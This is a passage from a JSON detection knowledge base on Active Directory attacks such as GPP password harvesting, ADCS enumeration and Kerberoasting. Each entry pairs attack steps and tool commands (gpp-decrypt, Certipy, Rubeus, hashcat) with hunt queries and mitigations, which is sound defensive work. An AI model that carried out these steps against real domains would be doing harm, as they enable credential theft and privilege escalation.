(gpttmpl.inf/groups.xml, etc.) to collect delegation settings, scheduled tasks, and GPP plaintext passwords.","how":"Authenticated users can read SYSVOL (\\\\corp.local\\SYSVOL). Explore risky settings in GPOs with Get-GPO -All, PowerView Get-NetGPO/Get-GPOLocation, and Group3r. In particular, GPP cpassword in Groups.xml and similar can be decrypted with the fixed AES key (gpp-decrypt). From GPO-linked OUs and applied targets, map access control and privilege distribution, and target writable GPOs for GPO Abuse.","tools":"PowerView Get-NetGPO, Get-GPO(GroupPolicy), Group3r, SharpGPOAbuse(偵察), gpp-decrypt, Snaffler","detect":"Signs include large-volume read access to XML/INF files on SYSVOL and LDAP enumeration of GPO objects. Monitor anomalies in SYSVOL share access (5145) and access to Groups.xml and similar. Periodically scan for residual GPP cpassword.","events":"5145(SYSVOLアクセス), 4662(GPOオブジェクト), 5136(GPO変更)","mitigate":"Delete all existing GPP cpassword within SYSVOL even in MS14-025-patched environments. Minimize GPO delegation (Write/Edit rights) and apply Tier separation. Proactively scan and remove sensitive data in SYSVOL with tools like Snaffler, and enable GPO change auditing.","triage":"On the DC/file server use 5145 with Share Name `SYSVOL` and RelativeTargetName pointing at GPP files like `Groups.xml`/`.inf` for bulk reads, 4662 for LDAP enumeration of GPO (groupPolicyContainer) objects, and 5136 for GPO changes. It is malicious when source Sysmon EID1 shows `Get-GPO`/PowerView `Get-NetGPO`/`Group3r`/`Snaffler` or 4104 chaining under one account/time, especially access to a `cpassword`-bearing Groups.xml. A GPO admin or SCCM/config-mgmt agent routinely reading SYSVOL for its scoped OUs is Benign; disambiguate by breadth (all GPOs vs. owned) and operator privilege.","hunt":[{"plat":"Sentinel","t":"Broad 5145 access to SYSVOL Groups.xml/GptTmpl.inf etc = black (GPP/GPO harvesting) / normal policy apply = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145 and ShareName has \"SYSVOL\"\n| where RelativeTargetName has_any (\"Groups.xml\",\"cpassword\",\"GptTmpl.inf\",\"ScheduledTasks.xml\",\"Services.xml\",\"Registry.xml\",\".inf\",\".xml\")\n| summarize Accesses=count(), Files=dcount(RelativeTargetName) by SubjectUserName, IpAddress, bin(TimeGenerated, 10m)\n| where Files > 20\n| order by Files desc"},{"plat":"MDE","t":"GPO enumeration commands (Get-GPO/Group3r/gpp-decrypt) executed = black / no match = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"Get-GPO\",\"Get-GPOReport\",\"Group3r\",\"Get-DomainGPO\",\"gpp-decrypt\",\"Get-GPPPassword\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName"}],"huntcs":[{"plat":"Event Search","t":"SYSVOL/Groups.xml crawl or GPP-decrypt tool=bad / gpupdate policy refresh=benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*\\\\SYSVOL\\\\*\" OR CommandLine=\"*Groups.xml*\" OR CommandLine=\"*Get-GPPPassword*\" OR CommandLine=\"*gpp-decrypt*\" OR CommandLine=\"*Snaffler*\" OR CommandLine=\"*Get-GPO*-All*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"}]},{"name":"Domain Trust Enumeration","aka":"nltest /domain_trusts, Get-NetDomainTrust, BloodHound Trusts","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1482, T1018","cve":"","sev":"Medium","summary":"Enumerates inter-domain/forest trusts with their direction and type (transitive/external/forest) to map lateral movement and privilege escalation paths.","how":"Enumerate trusts with nltest /domain_trusts /all_trusts, Get-NetDomainTrust (PowerView), Get-ADTrust, or SharpHound's Trusts collection. Check trust direction, SID filtering status, and transitivity to prepare for SID History abuse, cross-forest Kerberoast, and golden/silver ticket lateral movement using the trust key.","tools":"nltest, PowerView Get-NetDomainTrust, Get-ADTrust, SharpHound(Trusts), BloodHound","detect":"Signs include LDAP queries against trust objects (trustedDomain) and execution of nltest. Detect concentrated domain trust enumeration from a single host, or trust enumeration outside normal operations, with EDR/MDI.","events":"4662(trustedDomainオブジェクト), 4104","mitigate":"Remove unnecessary trusts and, for those retained, enable SID filtering (Quarantine) and selective authentication. Design the forest boundary as a security boundary and apply Tier separation. Audit trust configuration periodically.","triage":"On the DC use 4662 for LDAP queries against trustedDomain objects (CN=System,DC=…) and correlate with source Sysmon EID1 for `nltest /domain_trusts` or 4104 PowerView `Get-NetDomainTrust`/`Get-ADTrust`. It is a True Positive when trust enumeration concentrates from one host and is followed by 4769/4624 indicating SID History/cross-forest Kerberoast/trust-key abuse, corroborated by MDI/EDR. An IAM/migration/audit operator running a one-off `nltest` or `Get-ADTrust` for a trust inventory is Benign; disambiguate by the presence of follow-on offensive actions and execution frequency.","hunt":[{"plat":"MDE","t":"nltest /domain_trusts or Get-NetDomainTrust execution = black (trust enum) / no match = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"nltest\",\"domain_trusts\",\"Get-NetDomainTrust\",\"Get-DomainTrust\",\"Get-ADTrust\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName"},{"plat":"MDI","t":"LDAP queries against trustedDomain objects = black (trust mapping) / no match = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\" and Query has \"trustedDomain\"\n| project Timestamp, AccountName, IPAddress, DeviceName, Query, QueryTarget"}],"huntcs":[{"plat":"Event Search","t":"nltest /domain_trusts or Get-*DomainTrust run=bad / rare auth-time trust ref=benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*nltest*/domain_trusts*\" OR CommandLine=\"*nltest*/trusted_domains*\" OR CommandLine=\"*Get-NetDomainTrust*\" OR CommandLine=\"*Get-DomainTrust*\" OR CommandLine=\"*Get-ADTrust*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"}]},{"name":"SMB Share / Session Enumeration","aka":"NetSessionEnum, NetWkstaUserEnum, ShareFinder, Snaffler","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1135, T1049, T1033","cve":"","sev":"Medium","summary":"Enumerates network shares, active sessions, and logged-on users to locate sensitive files and privileged users.","how":"Discover readable shares with PowerView's Invoke-ShareFinder/Find-DomainShare, and identify hosts where privileged users are logged on with Get-NetSession/Invoke-UserHunter (NetSessionEnum/NetWkstaUserEnum can be enumerated with default low privileges). Automatically hunt passwords and key files within shares using Snaffler. SharpHound's Session collection works on the same principle.","tools":"PowerView(ShareFinder/UserHunter), Snaffler, NetExec --shares/--sessions/--loggedon-users, NetExec","detect":"Signals are NetSessionEnum/NetWkstaUserEnum RPC calls to many hosts and broad SMB share access. Monitor large volumes of 445 connections in a short window and spikes in share tree connections (5140). Privileged-user hunting via UserHunter is detectable with honey users.","events":"5140, 5145, 4624(Type3多発)","mitigate":"Apply Net Cease (restricting anonymous/regular-user access to NetSessionEnum). Minimize share ACLs and do not place sensitive files on shares. Enforce SMB signing and deploy EDR detection for Snaffler-type scanning.","triage":"Across many targets review 5140/5145 for broad share/tree connections and the source's EID3 for a short-lived flood of port-445 connections, checking whether NetSessionEnum/NetWkstaUserEnum RPC fans out to every host. It is malicious when source Sysmon EID1 shows PowerView `Invoke-ShareFinder`/`Invoke-UserHunter`/`Snaffler`/`NetExec --shares/--sessions/--loggedon-users`, targets show many Type3 4624, and honey-user location hunting appears. Routine share/session collection by a backup/audit/DLP/asset-mgmt agent is Benign; disambiguate by whether the source is a known ops server and the breadth stays within baseline.","hunt":[{"plat":"MDE","t":"One host/process making 445 connections to many hosts in minutes = black (ShareFinder/Snaffler) / a few share uses = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 445\n| summarize Hosts=dcount(RemoteIP) by DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, bin(Timestamp, 10m)\n| where Hosts > 30\n| order by Hosts desc"},{"plat":"Sentinel","t":"Spike of many share-tree connects (5140) from one source = black (share enum) / steady business access = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5140\n| where ShareName !in~ (\"\\\\\\\\*\\\\SYSVOL\",\"\\\\\\\\*\\\\NETLOGON\")\n| summarize Shares=dcount(ShareName), Access=count() by SubjectUserName, IpAddress, bin(TimeGenerated, 10m)\n| where Access > 50\n| order by Access desc"}],"huntcs":[{"plat":"LogScale","t":"one host fans out to many hosts on 445 (share/session enum)=bad / steady file share=benign","q":"#event_simpleName=NetworkConnectIP4\n| RemotePort=445\n| groupBy([aid, ComputerName, ContextBaseFileName], function=count(RemoteAddressIP4, as=hosts, distinct=true))\n| hosts > 40\n| sort(hosts, order=desc)"},{"plat":"Event Search","t":"Snaffler/ShareFinder/NetSessionEnum tooling=bad / normal one-off net view=benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*Invoke-ShareFinder*\" OR CommandLine=\"*Snaffler*\" OR CommandLine=\"*Find-DomainShare*\" OR CommandLine=\"*NetSessionEnum*\" OR CommandLine=\"*Invoke-UserHunter*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"}]},{"name":"Local / Domain Group Membership Enumeration","aka":"net group, Get-NetLocalGroup, Get-DomainGroupMember","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1069.001, T1069.002","cve":"","sev":"Medium","summary":"Enumerates members of privileged groups (Domain Admins/Enterprise Admins/local Administrators) to identify high-value targets.","how":"Use net group 'Domain Admins' /domain, Get-DomainGroupMember -Identity 'Domain Admins' -Recurse, and Get-NetLocalGroup -ComputerName host (remote local group enumeration via SAMR). Recursively expand nested groups to surface effective privilege holders and select lateral movement/escalation targets.","tools":"net group/localgroup, PowerView Get-DomainGroupMember/Get-NetLocalGroup, NetExec --local-groups","detect":"Signs include concentrated LDAP enumeration of privileged groups and remote local group enumeration via SAMR. Focus monitoring on access (4662/4661) to high-value groups such as Domain Admins. Detect anomalous SAMR remote calls with MDI.","events":"4662, 4661, 4799(ローカルグループ列挙)","mitigate":"Restrict SAMR enumeration to administrators only with Restrict clients allowed to make remote calls to SAM. Minimize privileged group membership and operate PAM/PIM. Enable auditing of 4799 (security-enabled local group enumeration).","triage":"On the DC use 4662/4661 for concentrated access to high-value group objects (e.g., the Domain Admins group object) and on targets review 4799 (local group membership enumeration via SAMR). It is a True Positive when source Sysmon EID1 shows `net group 'Domain Admins' /domain`/PowerView `Get-DomainGroupMember -Recurse`/`Get-NetLocalGroup`/`NetExec --local-groups` with consecutive queries indicating recursive nested expansion under one account/time, plus an MDI SAMR remote-call anomaly. A helpdesk/IAM/audit user running a one-off `net group` to check a single user's membership is Benign; disambiguate by whether it sweeps all privileged groups vs. an individual check, and by frequency.","hunt":[{"plat":"MDI","t":"SAMR remote enumeration of privileged groups; one host hitting many high-value groups=bad / a mgmt host single lookup=benign","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"SAMR\"\n| where Query has_any (\"Domain Admins\",\"Enterprise Admins\",\"Administrators\",\"Backup Operators\",\"Account Operators\")\n| summarize Queries=count(), Groups=make_set(QueryTarget, 20) by AccountName, DeviceName, IPAddress\n| where Queries > 5\n| sort by Queries desc"},{"plat":"Sentinel","t":"4799 local-group enumeration burst; one process enumerating privileged local groups repeatedly=bad / single admin-tool call=benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4799\n| where TargetUserName in~ (\"Administrators\",\"Remote Desktop Users\",\"Remote Management Users\",\"Backup Operators\")\n| summarize Enum=count(), Groups=make_set(TargetUserName, 10) by SubjectUserName, CallerProcessName, Computer, bin(TimeGenerated, 10m)\n| where Enum > 8\n| sort by Enum desc"}],"huntcs":[{"plat":"Event Search","t":"One host enumerating privileged groups = black / admin's one-off net group = white","q":"event_simpleName=ProcessRollup2 (FileName=net.exe OR FileName=net1.exe) CommandLine=\"*group*\"\n| where like(CommandLine,\"%Domain Admins%\") OR like(CommandLine,\"%Enterprise Admins%\") OR like(CommandLine,\"%localgroup%\")\n| stats count as runs, dc(CommandLine) as variants by ComputerName, UserName, ParentBaseFileName\n| where runs > 3 OR variants > 2"},{"plat":"LogScale","t":"Burst of PowerView/AD-module group-enum cmdlets = black / steady ops script = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/Get-(NetLocalGroup|DomainGroupMember|ADGroupMember)|Find-DomainUserLocation/i\n| groupBy([ComputerName, UserName, ParentBaseFileName], function=count(as=hits))\n| hits > 2"}]},{"name":"Password Policy / Account Enumeration","aka":"net accounts, Get-DomainPolicy, PSO enumeration","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1201, T1087.002","cve":"","sev":"Medium","summary":"Retrieve domain password policy and lockout thresholds to design a safe password-spraying strategy.","how":"Use net accounts /domain, Get-DomainPolicy, rpcclient getdompwinfo, or NetExec --pass-pol to obtain lockout threshold, observation window, and minimum length. Enumerate fine-grained password policies (PSO, msDS-PasswordSettings) via LDAP. Compute the attempt count and interval that avoid lockout as the basis for password spraying.","tools":"net accounts, PowerView Get-DomainPolicy, rpcclient(getdompwinfo), NetExec --pass-pol","detect":"LDAP queries against password policy objects or PSOs, and rpcclient getdompwinfo calls, are indicators. Correlate patterns where password spraying (single 4771/4625 events across many accounts) immediately follows.","events":"4662, 後続の4771/4625/4740(ロックアウト)","mitigate":"Deploy a strong password policy and smart lockout (Azure AD/Entra). Alert on single failures spread across many accounts to detect spraying. Enforce MFA broadly to reduce the value of policy information.","triage":"On the DC, pull 4662 (DS Access) for ReadProperty on the Domain root object and PSO (msDS-PasswordSettings), plus SAMR/getdompwinfo access, keyed by source account and source IP. It is a true positive if the same account/IP reads the policy and is immediately followed by 4771/4625 failures spread low-and-slow across many distinct accounts at an interval tuned to dodge 4740 lockout. It is benign if a one-off net accounts, logon-script/GPO evaluation, SCCM/asset inventory, or a known vuln scanner/monitoring host reads the policy with no ensuing spray.","hunt":[{"plat":"MDI","t":"LDAP query of password-policy/PSO attributes; concentrated lockout/maxPwdAge reads=bad / scheduled audit tool=benign","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| where Query has_any (\"maxPwdAge\",\"minPwdLength\",\"lockoutThreshold\",\"lockoutDuration\",\"msDS-PasswordSettings\",\"pwdProperties\")\n| summarize Queries=count(), Attrs=make_set(Query, 10) by AccountName, DeviceName, IPAddress\n| where Queries > 2\n| sort by Queries desc"},{"plat":"MDE","t":"net accounts / rpcclient getdompwinfo execution; policy pull before cred access=bad / admin operational check=benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where (FileName in~ (\"net.exe\",\"net1.exe\") and ProcessCommandLine has \"accounts\")\n    or ProcessCommandLine has_any (\"getdompwinfo\",\"Get-DomainPolicy\",\"Get-ADDefaultDomainPasswordPolicy\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"Pulling policy via net accounts/getdompwinfo = black / scheduled IT audit = white","q":"event_simpleName=ProcessRollup2\n| where like(CommandLine,\"%net accounts%\") OR like(CommandLine,\"%getdompwinfo%\") OR like(CommandLine,\"%Get-DomainPolicy%\") OR like(CommandLine,\"%Get-ADDefaultDomainPasswordPolicy%\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Event Search","t":"After policy read, one IP fails many accounts = spray black / single user typo = white","q":"event_simpleName=UserLogonFailed2 LogonType=3\n| stats count as fails, dc(UserName) as users by RemoteAddressIP4, ComputerName\n| where users > 10 AND fails > 15"}]},{"name":"Certificate Services / ADCS Enumeration","aka":"Certify find, Certipy find, PKINIT template enumeration","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1649, T1087","cve":"","sev":"High","summary":"Enumerate AD CS (certificate templates, CAs, enrollment rights) to discover vulnerable certificate templates such as ESC1-ESC16.","how":"As an authenticated user, run Certify.exe find /vulnerable or certipy find -vulnerable -u user@corp -p pass to LDAP-enumerate CA configuration and template enrollment rights, EKUs, and msPKI attributes. Identify ESC1-ESC16 privilege-escalation paths from misconfigurations (ENROLLEE_SUPPLIES_SUBJECT, Any Purpose EKU, dangerous ACLs). PKI objects reside in the Configuration partition.","tools":"Certify, Certipy, PSPKIAudit, Locksmith(防御側監査)","detect":"Enumeration access to certificate templates / pKIEnrollmentService in the Configuration partition is an indicator. Monitor anomalous certificate requests (4886/4887) on CAs and enrollment against vulnerable templates. Detect the characteristic LDAP queries of Certipy/Certify.","events":"4662(PKIオブジェクト), 4886, 4887(証明書発行)","mitigate":"Inventory vulnerable templates with Locksmith/PSPKIAudit and remediate ESC1 etc. (disable ENROLLEE_SUPPLIES_SUBJECT, require Manager approval). Enable CA auditing and minimize enrollment rights.","triage":"On the DC Configuration partition, review 4662 for concentrated ReadProperty against certificationAuthority/pKIEnrollmentService/pKICertificateTemplate objects under CN=Public Key Services (msPKI-*, pKIExtendedKeyUsage, nTSecurityDescriptor), keyed by account, and correlate with a spike of 4886/4887 on the CA. It is malicious if a low-priv account bulk-enumerates all templates then submits a 4886 request against a vulnerable template (e.g. ESC1) followed by 4887 issuance. It is benign for defensive audits (PSPKIAudit/Locksmith), client autoenrollment, or scheduled PKI-admin/SCCM inventory with no anomalous request.","hunt":[{"plat":"MDI","t":"LDAP enum of ADCS templates/enrollment services in Configuration; Certipy/Certify-style queries=bad / normal PKI admin=benign","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| where Query has_any (\"pKIEnrollmentService\",\"certificateTemplates\",\"pKICertificateTemplate\",\"msPKI-Certificate-Name-Flag\",\"CN=Enrollment Services\",\"CN=Certificate Templates\")\n| summarize Queries=count(), Objs=make_set(QueryTarget, 20) by AccountName, DeviceName, IPAddress\n| where Queries > 3\n| sort by Queries desc"},{"plat":"MDE","t":"Certify/Certipy template-enum execution; find or vulnerable-template args=bad / normal cert request=benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName in~ (\"Certify.exe\",\"certipy.exe\",\"certipy-ad.exe\")\n    or ProcessCommandLine has_any (\"Certify.exe find\",\"certipy find\",\"find -vulnerable\",\"find /vulnerable\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| sort by Timestamp desc"}],"huntcs":[{"plat":"LogScale","t":"Certipy/Certify find or certutil template enum = black / PKI admin's daily certutil = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(certipy(-ad)?\\s+find|Certify(\\.exe)?\\s+find|certutil.*-(template|ca|dstemplate)|Get-CertificateTemplate)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"Delegation Enumeration (Unconstrained/Constrained/RBCD)","aka":"Get-NetComputer -Unconstrained, findDelegation, Find-InterestingDomainAcl","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002, T1558","cve":"","sev":"High","summary":"Enumerate accounts configured for Kerberos delegation (unconstrained/constrained/resource-based) to identify targets for privilege escalation.","how":"Search LDAP for userAccountControl TRUSTED_FOR_DELEGATION (unconstrained), msDS-AllowedToDelegateTo (constrained), and msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD). Enumerate with Get-NetComputer -Unconstrained, findDelegation.py, or PowerView Get-DomainComputer -TrustedToAuth. Unconstrained-delegation hosts become targets for TGT theft via follow-on printer-bug/coerce attacks.","tools":"PowerView(Get-DomainComputer -Unconstrained/-TrustedToAuth), findDelegation.py(impacket), BloodHound, Certipy","detect":"Focused LDAP queries against delegation-related attributes (userAccountControl, msDS-AllowedToDelegateTo, etc.) are indicators. They often appear as part of BloodHound collection; correlate via DS Access auditing. Monitor delegation configuration changes (5136) as well.","events":"4662, 5136(委任属性変更)","mitigate":"Retire unconstrained delegation and migrate to resource-based constrained delegation. Set 'Account is sensitive and cannot be delegated' / Protected Users on privileged accounts. Audit delegation settings regularly and enforce tier separation.","triage":"On the DC, check 4662 for sweeping ReadProperty against userAccountControl, msDS-AllowedToDelegateTo, and msDS-AllowedToActOnBehalfOfOtherIdentity by source account, and watch 5136 for delegation-attribute changes. It is malicious if a low-priv account enumerates all computers/users (BloodHound collection pattern) and is then followed by coercion/PrinterBug against an unconstrained host or a 5136 RBCD write. It is benign for sanctioned BloodHound audits or CMDB/asset/monitoring tools doing periodic LDAP reads with no write or follow-on attack.","hunt":[{"plat":"MDI","t":"Concentrated LDAP query of delegation attrs (msDS-AllowedToDelegateTo/RBCD/TRUSTED_FOR_DELEGATION); part of BloodHound collection=bad / single lookup=benign","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| where Query has_any (\"msDS-AllowedToDelegateTo\",\"msDS-AllowedToActOnBehalfOfOtherIdentity\",\"userAccountControl:1.2.840.113556.1.4.803:=524288\",\"TRUSTED_FOR_DELEGATION\",\"TRUSTED_TO_AUTH_FOR_DELEGATION\")\n| summarize Queries=count(), Attrs=make_set(Query, 10) by AccountName, DeviceName, IPAddress\n| where Queries > 2\n| sort by Queries desc"},{"plat":"Sentinel","t":"5136 write to delegation attrs (RBCD/AllowedToDelegateTo); sudden delegation target add=bad / planned admin change=benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has_any (\"msDS-AllowedToActOnBehalfOfOtherIdentity\",\"msDS-AllowedToDelegateTo\")\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, OperationType, Properties\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"PowerView enum targeting delegation attrs = black / sanctioned BloodHound drill = grey/white","q":"event_simpleName=ProcessRollup2\n| where like(CommandLine,\"%Unconstrained%\") OR like(CommandLine,\"%TrustedToAuth%\") OR like(CommandLine,\"%AllowedToDelegate%\") OR like(CommandLine,\"%findDelegation%\") OR like(CommandLine,\"%Find-InterestingDomainAcl%\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"LDAP enum of delegation attrs is DC-only; use Identity Protection recon detection","q":"// Falcon Identity Protection detection: Reconnaissance / LDAP enumeration of delegation attributes (4662 DS-Access). No attacker-host EDR footprint beyond the process query above."}]},{"name":"Kerberoasting","aka":"SPN Roasting / Service Ticket Cracking (GetUserSPNs)","phase":"credaccess","group":"Kerberos","mitre":"T1558.003","cve":"","sev":"High","summary":"Request TGS-REP (service tickets) for SPN-configured service accounts and brute-force offline the portion encrypted with the service account's password hash to recover the password.","how":"With any domain-authenticated user (low privilege suffices), LDAP-enumerate user accounts holding a servicePrincipalName, send TGS-REQ for those SPNs, and obtain TGS-REP. The KDC encrypts tickets with the service account's NTLM hash (RC4) or AES key, so crack it offline with hashcat (-m 13100=TGS-REP RC4 / -m 19600=AES128 / -m 19700=AES256) via dictionary/brute force. The only prerequisite is one valid account in the domain; access to the target account is not required.","tools":"Rubeus (kerberoast /nowrap /rc4opsec), impacket GetUserSPNs.py, PowerView Invoke-Kerberoast, mimikatz kerberos::list /export, hashcat -m 13100/19600/19700","detect":"Monitor Event ID 4769 (Kerberos service ticket request) for anomalously high TicketEncryptionType 0x17 (RC4) or 0x18, or a pattern where one account issues TGS requests for many distinct SPNs in a short window. In particular, RC4 requested in an AES-capable environment is a downgrade indicator. Skew in Ticket Options or client address are also signals.","events":"4769 (Ticket Encryption Type 0x17=RC4-HMAC が主指標), 補助的に4768","mitigate":"Use 25+ character random passwords or gMSA/dMSA for service accounts, and enforce AES encryption domain-wide to disable RC4. Remove unnecessary SPNs, restrict service accounts with Protected Users or authentication policies, and introduce regular password rotation and honey-SPN accounts for early detection.","triage":"Aggregate DC 4769 by source account and client address, looking for Ticket Encryption Type 0x17 (RC4) and one account requesting many distinct Service Names in a short window. It is malicious if the origin host's Sysmon EID1 shows rubeus.exe/GetUserSPNs execution or a bulk SPN LDAP enumeration preceding it and 0x17 is forced in an AES-capable domain. It is benign when service accounts (SCCM/monitoring/backup) routinely request a small fixed set of SPNs at 0x12 (AES), or a legacy app produces steady RC4 to a fixed target during business hours.","hunt":[{"plat":"Sentinel","t":"4769 RC4(0x17) TGS requests from one account fanning to many SPNs=bad / single service normal use=benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TicketEncryptionType == \"0x17\"\n| where ServiceName != \"krbtgt\" and ServiceName !endswith \"$\"\n| summarize SPNs=dcount(ServiceName), Services=make_set(ServiceName, 20), Reqs=count() by TargetUserName, IpAddress\n| where SPNs > 5\n| sort by SPNs desc"}],"huntcs":[{"plat":"LogScale","t":"Rubeus/GetUserSPNs/Invoke-Kerberoast run = black / setspn -L inventory only = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Rubeus.*(kerberoast|asktgs)|GetUserSPNs(\\.py)?|Invoke-Kerberoast|rubeus\\.exe)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=hits))"},{"plat":"Identity Protection","t":"One account, many SPNs, RC4(0x17) TGS in AES realm = black; 4769 is DC-only","q":"// Falcon Identity Protection detection: Kerberoasting (4769 TicketEncryptionType 0x17/0x18 anomaly, high distinct-SPN fan-out per account). Not visible in host EDR telemetry."}]},{"name":"Targeted Kerberoasting","aka":"SPN-jacking / servicePrincipalName write abuse","phase":"credaccess","group":"Kerberos","mitre":"T1558.003","cve":"","sev":"High","summary":"When the attacker holds write access (GenericWrite/WriteProperty) to a target user object, temporarily assign an SPN to make it Kerberoastable, then remove the SPN after obtaining the hash.","how":"Prerequisite is holding WriteProperty/GenericWrite/GenericAll over the target account. Write an arbitrary SPN (e.g. fake/host) to the servicePrincipalName attribute, Kerberoast the account to obtain TGS-REP, crack offline, then restore the SPN to erase traces. Unlike ordinary Kerberoasting, users without an SPN can also be targeted.","tools":"PowerView Set-DomainObject -Set servicePrincipalName, targetedKerberoast.py, Rubeus, BloodHoundでの書き込み権限特定","detect":"Monitor Event ID 5136 (directory service object change) indicating servicePrincipalName modification, and correlate the sequence of SPN assignment, immediate 4769, then SPN removal. An SPN suddenly appearing on a normal user is a strong anomaly signal.","events":"5136 (servicePrincipalName変更), 4769, 4738","mitigate":"Inventory and minimize excessive Write rights (ACLs) on user objects, and enable SACL auditing of SPN attribute changes. Visualize attack paths with BloodHound and remove dangerous delegation rights; enforce AES to raise cracking cost.","triage":"On the DC, monitor 5136 for servicePrincipalName additions, checking the Value/Operation (Value Added) and the actor account, flagging SPN grants to user accounts that normally have none. It is malicious if SPN-add (5136) then a 4769 (esp. 0x17) against that account then an SPN-delete (5136 Value Deleted) within minutes chain under one actor, accompanied by 4738. It is benign for legitimate SPN registration during app deploy/migration (Exchange/SQL) or helpdesk service-account config, where the SPN persists and is not deleted.","hunt":[{"plat":"Sentinel","t":"5136 servicePrincipalName suddenly written to a normal user; SPN-write staged for imminent 4769=bad / legit service account setup=benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"servicePrincipalName\"\n| where OperationType == \"%%14674\"  // value added\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, Properties\n| sort by TimeGenerated desc"},{"plat":"MDE","t":"setspn -add / Set-ADUser -ServicePrincipalName execution; bolt-on SPN to a user=bad / admin service registration=benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where (FileName =~ \"setspn.exe\" and ProcessCommandLine has \"-add\")\n    or (ProcessCommandLine has \"ServicePrincipalName\" and ProcessCommandLine has_any (\"Set-ADUser\",\"-Add\",\"@{Add\"))\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"Writing servicePrincipalName onto a normal user = black / legit setspn at deploy = white","q":"event_simpleName=ProcessRollup2 CommandLine=\"*servicePrincipalName*\"\n| where like(CommandLine,\"%Set-DomainObject%\") OR like(CommandLine,\"%Set-ADUser%\") OR like(CommandLine,\"%setspn%-A%\") OR like(CommandLine,\"%setspn -s%\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"SPN-set -> immediate 4769 -> SPN-remove sequence correlates on DC 5136/4769","q":"// Falcon Identity Protection detection: Targeted/SPN-jacking Kerberoasting (5136 servicePrincipalName write followed by 4769 then SPN removal). DC-only; pair with the host write-command query above."}]},{"name":"Kerberoasting without pre-authentication","aka":"AS-REQ Kerberoasting / GhostSPN","phase":"credaccess","group":"Kerberos","mitre":"T1558.003","cve":"","sev":"Medium","summary":"A variant that abuses accounts with pre-authentication disabled (DONT_REQ_PREAUTH), or write access to the target, to obtain Kerberoastable ticket material via AS-REQ without using any authenticated account.","how":"Prerequisite is either write access to set DONT_REQUIRE_PREAUTH in the target's UserAccountControl, or that it is already disabled. Send an AS-REQ; normally this returns a TGT AS-REP, but by specifying an SPN you obtain a service-ticket-equivalent encrypted blob without pre-authentication and crack it offline. This can be executed even from a position without domain credentials.","tools":"Rubeus (asreproast/kerberoast の組み合わせ), impacket改変スクリプト, targetedKerberoast","detect":"Monitor Event ID 4768 with PreAuthType=0 (no pre-authentication) indicating a pre-auth-less AS-REQ, and detect SPN-bearing requests or RC4 encryption types. Track DONT_REQ_PREAUTH flag changes in UserAccountControl (4738) as well.","events":"4768 (Pre-Auth Type 0), 4738 (UAC変更)","mitigate":"Require pre-authentication on all accounts (clear DONT_REQ_PREAUTH) and audit UAC attribute changes. Restrict SPN write rights, enforce AES, and perform regular configuration-drift inspection.","triage":"On the DC, track 4738 for the DONT_REQUIRE_PREAUTH UAC bit being set, and review 4768 for Pre-Authentication Type=0 with an SPN in Service Name and Encryption Type 0x17, keyed by source IP. It is malicious if preauth-disable (4738) chains into an SPN-bearing AS-REQ (4768, PreAuth 0/RC4) against the same target with no legitimate interactive logon. It is 